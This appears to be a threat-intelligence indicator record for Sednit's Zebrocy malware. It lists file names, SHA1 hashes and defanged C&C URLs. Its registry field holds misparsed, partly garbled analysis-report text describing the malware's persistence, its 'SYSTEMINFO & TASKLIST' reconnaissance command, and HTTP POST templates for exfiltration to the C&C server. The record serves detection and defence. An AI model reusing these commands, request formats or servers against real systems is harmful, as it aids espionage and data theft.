{"rule_id": 680, "name": "sednit-update-analysis-zebrocy_", "description": "-", "references": [], "File_Names": ["id77820082.php", "Delf.BEX", "checkUpdate89732468.php", "Autoit.OHC", "Autoit.OCI", "118253.php", "Events76.php", "Autoit.OCO", "Autoit.OMB", "Autoit.EI", "version333.php", "MsKZrpUfe.php", "setwsdv4.php", "support.php", "Autoit.OBG", "realui.php", "StaticIpUpdateLog23741033.php", "viewsupp.php", "CheckNow864.php", "srsiymyw.doc", "Delf.AWE", "Agent.YC", "11.php", "Delf.BDT", "List_20160606.exe", "en.php", "19.app", "fdfd_iunb_hhert_ps.php", "88291.php", "Agent.AAK", "lookup.php", "SecurityID.php", "srsiymyw.exe", "TrojanDownloader.Delf", "Delf.BFN", "315.TXT", "provocations.doc", "18862.php", "Autoit.CT", "crmclients.php", "Card.doc", "checkUpdate79832467.php", "REM1234.php", "ApiMap.php", "obtenerId.php", "winhttp.dll", "details.php", "Autoit.OMA", "15.dat", "CLISD1934.php", "sol41.php", "func112SerErr.php", "Delf.BEB", "client.php", "db7749sc.php", "opt.php", "OspRkzmG.php", "Delf.BDW", "csrsvc.exe", "Delf.BEH", "Delf.BFF", "event.php", "Application.Run", "Delf.BBP", "NewBaseCheck.php", "userid.php", "Delf.AVT", "EspTkzmH.php", "Autoit.ODO", "Delf.BFC", "Delf.AVP", "suppid.php", "Delf.BEC"], "MD5_Hashes": [], "SHA1_Hashes": ["37bd951c483da057337ef8f38d6e48051cbb39d0", "4e6470f4a245efaa138c8c6eedb046e916706383", "2b5a7f4e054d0130883c8821b629121e0228bf54", "4a6dcbccab5344388b331d543cc2260ca531c7ca", "226083c7190f1a939d5b7b352400450690d59f65", "afd5a60b7fff4deea15f7011339ad2cc2987a937", "54b14fc84f152b43c63babc46f2597b053e94627", "00b39f2deaf1f1fc29e5acb63f4d1100e04fd701", "f63e29621c8becac47ae6eac7bf9577bd0a37b73", "267abd7105ac26d5cb6ecb96292f83708f64b994", "245868d6805c66181808973e93f23293d6d2f7d1", "d4ab51bc5c26183771e3358d76e348943f9dd2fc", "4f07d18475601d0492cbf678ee0f0860c729910e", "dabeadf0a9af3a8a0802f8445670806cd7671b1d", "8bd56b580974ae195e9f92b3aa525547d33434c1", "c0271dbb02636402742c390ffbeee6418f696668", "41686703ce9e9aec64b6ad1c516746751219bc62", "d6fdc72792ee736b8d606d40d72cb89d6e8a3e18", "c08d89c7f7be69d5d705d4ac7e24e8f48e22faaf", "9beacd8e145fa01e16409d44d8b9470af6c7afd8", "83882e13b369986b513f4aae245c112b82ec2097", "4ccbe222bd97dc229b36efaf52520939da9d51c8", "f10b2c052afc07e2dec9dbe816031059fdc900ba", "ae93b6ec2d56512a1c7e8c053d2a6ce6fdfb7e4c", "7349843e4dac1226ad6ce3e3cda8c389dd599548", "0f946f619ae8e2181a5bd76c8af03347742765c6", "0983d940ba42135106bf7a1e87ed5a1975fc7ead", "0cd61d367dd0b13000774ab77abf3d4cfb713c8e", "8aedf7a462024acf72d708c89230e4f02d94bc78", "a172fe6e91170f858c8ce5d734c094996bdf83d0", "07e44b44c5f1043d16f6011a2cf0d2e7c5a52787", "cdf9c24b86bc9a872035dcf3f53f380c904ed98b", "fea8752d90d2b4f0fc49ac0d58d62090782d8c5b", "185ab7a371b58ff367c155ec0dabe28842d340bd", "6fd7ce97061169b835ea77976651b5bf20aca4ef", "c2f3ca699aef3d226a800c2262efdca1470e00dc", "7b5c223a4968cc2190c1b5444cad47187d27ec50", "b8b847d3d0139db68dba730b3424b29dcb40b3c7", "2c01ae417e5de213845b1ed46d4e82d45edd598d", "51ae516792570bcd069a657c27859cd3fdc07d00", "2900ed173a9f5dc99f905942a6be595cc6f03387", "62dcf2f33ecc6014fa9a10f4e9ac9fd9bb0a6d23", "55179f0c6bce5a37311a44efe3f9845096c09668", "d379b94a3eb4fd9c9a973f64d436d7fc2e9d6762", "36b5e59a01e7f244d4a3bbb539e57aa468115dc8"], "SHA256_Hashes": [], "Registry_Entries": ["HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\ with the path of the\n\nhardcoded filename.\n\nTo gather information, the malware creates a new process using the Windows API\n\nCreateProcess function with cmd.exe /c SYSTEMINFO & TASKLIST as lpCommandLine\n\nargument. Once the information is retrieved, it sends the result via a HTTP POST request to the\n\nPDFmyURL - online url to pdf conversion\n\n\fC&C server hardcoded in the binary. It retries until it receives the next stage.\n\n1\n\n2\n\n3\n\n4\n\n5\n\n6\n\n7\n\n8\n\n9\n\n10\n\n11\n\n12\n\n13\n\n14\n\n15\n\n16\n\n17\n\n18\n\n19\n\nPOST (\\/[a-zA-Z0-9\\-\\_\\^\\.]*){3}\\.(php|dat)?fort=<SerialNumber_C> HTTP/1.0\n\nConnection: keep-alive\n\nContent-Type: application/x-www-form-urlencoded\n\nContent-Length: xxxx\n\nHost: <ip_address>\n\nAccept: text/html, */*\n\nAccept-Encoding: identity\n\nUser-Agent: Mozilla v5.1 (Windows NT 6.1; rv:6.0.1) Gecko/20100101 Firefox/6.0.1\n\npol=MM/DD/YYYY%20HH:MM:SS%20(AM|PM)%0D%0A<DriveListing>%0D%0A%0D%0A<Path_to_the_binary>%0D%0A%0D%\n\n[...]\n\nDelphi downloader HTTP POST request\n\nOnce the request has been sent, the C&C server responds by sending the next stage, if the target is\n\nconsidered interesting by the operator. The time elapsing between the sending of the report and the\n\nreceipt of the payload is a few hours. This next stage is written into the file created earlier and\n\nexecuted.\n\nPDFmyURL - online url to pdf conversion\n\n \n \n \n \n \n \n \n \n \n\fAutoIt downloader\n\nThe AutoIt downloader is another layer of the reconnaissance phase during an infection of the\n\nvictim computer. From this point onwards, two scenarios are possible: in the first one, the\n\nDelphi downloader is the first stage and the second stage \u2013 which is the AutoIt downloader \u2013 is\n\na lightweight downloader. In the other scenario, the AutoIt downloader is the first stage and it\n\nhas all functionalities of the Delphi downloader and even more.\n\nWhen the AutoIt downloader is the first stage it performs many reconnaissance functions. Even\n\nif this one shares some similarities with the Delphi downloader, such as the persistence\n\nmechanism and the splash window, it adds more granularity to the reconnaissance phase than\n\nthat of the Delphi downloader. Here is a non-exhaustive list of its capabilities:\n\nDetect sandbox and virtual environment\n\nGet list of installed software (via\nHKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall)\n\nGet Windows version (32-bit or 64-bit)\n\nGet the process list\n\nPDFmyURL - online url to pdf conversion\n\n\fGet hard drive information\n\nGet screenshot\n\nGet various information about the victim computer using Windows Management Instrumentation\n(WMI) objects, probably inspired by code from this GitHub repository\n\nDepending on the previous stage, the name of the AutoIt binary is different. If the malware is\n\ndropped as the first stage, it has a document-like name. Otherwise it is given the name\n\nhardcoded in the Delphi downloader, as shown in Table 1.\n\nPDFmyURL - online url to pdf conversion\n\n\fTable 1: AutoIt binary filenames, depending of the first stage\nTable 1: AutoIt binary filenames, depending of the first stage\n\nFi rs t Stage\nFi rs t Stage\n\nAutoIt b i nary Fi l enames\nAutoIt b i nary Fi l enames\n\nDel phi  d ownl oad er\nDel phi  d ownl oad er\n\ncsrsvc.exe\n\nEmai l  attachment\nEmai l  attachment\n\nProtocol List_20160606.exe\n\nThe purpose of this stage is more of less the same as the previous one. There are many\n\ndifferent versions in the wild but all of them include at least the code to achieve the following:\n\nRetrieve the serial number of the hard drive C:\n\nUse network functions from winhttp.dll or winhttp.au3\n\nPDFmyURL - online url to pdf conversion\n\n\fExecute the payload received from the C&C server\n\nIn the same way that the Delphi downloader has a splash window, the AutoIt also has a splash\n\nwindow when it comes from an email attachment \u2013 the AutoIt is the first stage. The splash screen is\n\nrelated to the binary icon. For example, an AutoIt downloader with Adobe Reader as an icon displays\n\na splash screen saying that the PDF file the victim would be expecting to be displayed is corrupted. An\n\nAutoIt binary with a Word icon will display the following popup asking for a password. The password\n\nis not considered here; we think it\u2019s just a way to distract the victim from the code\u2019s real malicious\n\nactivity.\n\nFigure 5: AutoIt downloader Word popup\n\nDelphi backdoor\n\nPDFmyURL - online url to pdf conversion\n\n\fThe Delphi backdoor is the final stage of the Zebrocy chain of components. We have seen\n\nZebrocy downloading the Sednit group\u2019s flagship backdoor, Xagent, in the past.\n\nUnlike the previous components, this one has an internal version number that doesn\u2019t seem to\n\nbe related to a specific campaign. This version number has evolved over time, as shown in Table\n\n2:\n\nTable 2: Delphi backdoor internal version history\nTable 2: Delphi backdoor internal version history\n\nPE ti mes tamp\nPE ti mes tamp\n\nvers i on\nvers i on\n\n2015-12-28\n\n2016-01-06\n\n2016-01-25\n\n2016-02-03\n\n2016-03-14\n\n2016-04-08\n\nPDFmyURL - online url to pdf conversion\n\n2.1\n\n2.2\n\n2.3\n\n2.4\n\n2.5\n\n3.0\n\n\f2016-04-26\n\n2016-06-01\n\n2016-09-08\n\n2016-12-15\n\n2017-06-01\n\n2017-09-26\n\n2017-10-12\n\n2017-11-12\n\n2017-12-26\n\n2018-01-09\n\n2017-12-18\n\n2018-01-09\n\n2018-01-16\n\n2018-01-18\n\nPDFmyURL - online url to pdf conversion\n\nTable 2: Delphi backdoor internal version history\nTable 2: Delphi backdoor internal version history\n\n3.2\n\n4.4\n\n5.0\n\n5.1\n\n7.0\n\n8.0\n\n8.1\n\n8.2\n\n8.5\n\n8.6\n\n10.1\n\n10.2\n\n10.3\n\n11.0\n\n\f2018-02-07\n\n2018-03-05\n\n2018-03-06\n\n2018-03-14\n\n2018-03-28\n\nTable 2: Delphi backdoor internal version history\nTable 2: Delphi backdoor internal version history\n\n12.0\n\n13.0\n\n13.1\n\n14.0\n\n14.1\n\nNotice that we don\u2019t have the full visibility and we may have missed some versions of the\n\nbackdoor. Besides, there is some overlap between versions meaning that some older versions\n\nare still used at the same time as newer versions.\n\nIn the next few paragraphs we will highlight some differences seen in the malware during its\n\nevolution.\n\nThe backdoor embeds a block of configuration. The configuration values change from one\n\nsample to another, but the list of configurable items stays the same. However, the way in which\n\nthe configuration data are stored in the malware sample has evolved over time.\n\nThe first versions of the backdoor embedded the configuration data in plaintext, as shown in\n\nFigure 6.\n\nPDFmyURL - online url to pdf conversion\n\n\fFigure 6: Delphi backdoor plaintext configuration data\n\nThen, in later versions, the malware\u2019s authors encoded the configuration data as hexadecimal strings,\n\nas shown in Figure 7.\n\nPDFmyURL - online url to pdf conversion\n\n\fFigure 7: Delphi backdoor encoded configuration data\n\nIn the latest versions, the configuration data is encrypted in the resources using the AES\n\nalgorithm. Older versions stored it in the .text section.\n\nThe configuration data contains:\n\nAES keys to communicate with the C&C server\n\nURLs with paths differing from one sample to another\n\nThe version of the malware\n\nThe windows registry key/value that ensures the persistence of the backdoor\n\nPDFmyURL - online url to pdf conversion\n\n\fPath where temporary files are store (%APPDATA%)\n\nThe names of hidden directories to be created to store temporary files: the directory filenames are\nconcatenated with the environment variable (%APPDATA%)\n\nOnce the malware is set up, it executes callback functions via the Windows API function\n\nSetTimer. These callbacks allow the operator to handle many features and commands of the\n\nbackdoor.\n\nTake a screenshot of the Desktop of the victim\n\nCapture keystrokes\n\nList drives/network resources\n\nRead/write into Windows registry\n\nCopy/move/delete a file system object\n\nExecute files or create scheduled tasks\n\nThe number of commands handled by the backdoor \u2013 about 30 \u2013 differs from one version to\n\nanother.\n\nPDFmyURL - online url to pdf conversion\n\n\fTo communicate with the C&C server, the backdoor stores the report of these functions into a\n\ntemporary file. Then it will read the content of the temporary file and send it on. These\n\ntemporary files are stored in one of the hidden directories created during the set-up phase.\n\n1\n\n2\n\n3\n\n4\n\n5\n\n6\n\n7\n\n8\n\n9\n\n10\n\n11\n\n12\n\n13\n\n14\n\n15\n\n16\n\n17\n\n18\n\n19\n\n20\n\n21\n\n22\n\n23\n\n24\n\n25\n\nPOST (\\/[a-zA-Z0-9\\-\\_\\^\\.]*){3}\\.(php|dat). HTTP/1.0\n\nConnection: keep-alive\n\nContent-Type: multipart/form-data; boundary=--------<mmddyyhhnnsszzz>\n\nContent-Length: <N>\n\nHost: <ip_address>\n\nAccept: text/html, */*\n\nAccept-Encoding: identity\n\nUser-Agent: Mozilla/3.0 (compatible; Indy Library)\n\n----------<mmddyyhhnnsszzz>\n\nContent-Disposition: form-data; name="], "URLs": ["http://89[.]40.181.126/verification-online/service.911-19/check-verification-88291.php", "http://93[.]113.131.155/Verifica-El-Lanzamiento/Ayuda-Del-Sistema/obtenerId.php", "http://93[.]113.131.117/KB7735-9927/security-serv/opt.php", "http://86[.]105.18.106/versionID/Plugin0899/debug-release01119/debug-19.app", "http://80[.]255.6.5/daily-update-certifaicates52735462534234/update-15.dat", "http://185[.]25.50.93/tech99-04/litelib1/setwsdv4.php", "http://213[.]103.67.193/ghflYvz/vmwWIdx/realui.php", "http://213[.]252.245.132/search-release/Search-Version/crmclients.php", "http://188[.]241.68.121/update/dB-Release/NewBaseCheck.php", "http://185[.]25.51.164/srv_upd_dest_two/destBB/en.php", "http://185[.]25.50.93/syshelp/kd8812u/protocol.php", "http://194[.]187.249.126/security-services-DMHA-group/info-update-version/id77820082.php", "http://86[.]106.131.177/srvSettings/conf4421i/support.php", "http://185[.]25.51.114/get-help-software/get-app-c/error-code-lookup.php", "http://86[.]106.131.177/SupportA91i/syshelpA774i/viewsupp.php", "http://89[.]249.65.166/clientid-and-uniqued-r2/the-differenceU/Events76.php", "http://89[.]45.67.153/grenadLibS44-two/fIndToClose12t3/sol41.php", "http://89[.]249.65.166/int-release/check-user/userid.php", "http://rammatica[.]com/QqrAzMjp/CmKjzk/OspRkzmG.php", "http://194[.]187.249.126/database-update-centre/check-system-version/id=18862.php", "http://213[.]252.244.219/cumulative-security-update/Summary/details.php", "http://46[.]183.223.227/services-check-update/security-certificate-11-554/CheckNow864.php", "http://213[.]252.245.132/setting-the-os-release/Support-OS-release/ApiMap.php", "http://185[.]25.51.198/get-data/searchId/get.php", "http://80[.]255.6.5/LoG-statistic8397420934809/date-", "http://142[.]0.68.2/test-update-16-8852418/temp727612430/checkUpdate89732468.php", "http://93[.]115.38.132/wWpYdSMRulkdp/arpz/MsKZrpUfe.php", "http://220[.]158.216.127/search-sys-update-release/base-sync/db7749sc.php", "http://86[.]105.18.111/UpdateCertificate33-33725cnm^BB/CheckerNow-saMbA-99-", "http://46[.]102.152.127/messageID/get-data/SecurityID.php", "http://213[.]252.244.219/client-update-info/version-id/version333.php", "http://185[.]25.51.198/stream-upd-service-two/definition/event.php", "http://86[.]105.18.106/ram-data/managerId/REM1234.php", "http://185[.]77.129.152/wWpYdSMRulkdp/arpz/MsKZrpUfe.php", "http://142[.]0.68.2/test-update-17-8752417/temp827612480/checkUpdate79832467.php", "http://86[.]105.18.106/debug-info/pluginId/CLISD1934.php", "http://86[.]105.18.106/apps.update/DetailsID/clientPID-118253.php", "http://89[.]45.67.153/supportfsys/t863321i/func112SerErr.php", "http://222[.]15.23.121/gft_piyes/ndhfkuryhs09/fdfd_iunb_hhert_ps.php", "http://86[.]105.18.106/data-extract/timermodule/update-client.php", "http://89[.]249.65.234/guard-service/Servers-ip4/upd-release/mdb4", "http://rammatica[.]com/QqrAzMjp/CmKjzk/EspTkzmH.php", "http://185[.]25.50.93/techicalBS391-two/supptech18i/suppid.php"], "weight": 0.0}